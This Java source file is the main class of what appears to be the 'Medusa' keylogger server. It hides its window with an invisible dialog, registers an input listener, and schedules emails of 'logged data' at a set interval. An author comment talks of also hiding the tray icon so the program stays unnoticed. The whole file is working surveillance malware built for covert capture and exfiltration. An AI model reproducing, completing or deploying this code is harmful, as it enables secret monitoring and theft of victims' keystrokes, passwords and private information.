package net.lotusdev.medusa.server;

import java.awt.EventQueue;
import java.awt.SystemTray;
import java.awt.TrayIcon;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import javax.imageio.ImageIO;
import javax.swing.JDialog;
import javax.swing.JFrame;

/**
 * Main.java
 * @author Jabaar
 *
 */

public class Main {
	public static void main(String[] args) {
        new Main();
    }

    public Main() {
        EventQueue.invokeLater(new Runnable() {
            @Override
            public void run() {
                try {
                    TrayIcon icon = new TrayIcon(ImageIO.read(Main.class.getResource("res/exclamation.png")));
                    SystemTray tray = SystemTray.getSystemTray();
                    tray.add(icon);
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
                /**
                 * JDialogs can be "closed" while they are still running. I will find a way to hide tray icon too.
                 */
                JDialog dialog = new JDialog();
                dialog.setSize(0, 0);
                dialog.setVisible(false);
                Listener.register();
                sendData();
            }
        });
    }
    
    public static void sendData() {
    	/**
    	 * Email method with a simple JavaMail client.
    	 */
    	ScheduledExecutorService execService = Executors.newScheduledThreadPool(3);

    	/**
    	 * Sends logged data every <set> minutes via email.
    	 */
    	execService.scheduleAtFixedRate(new Runnable() {
    		public void run() {
    			MailHandler.sendMail();
    		}
    	}, 0L, SettingsImport.getTimeout(), TimeUnit.MINUTES);
    }
}
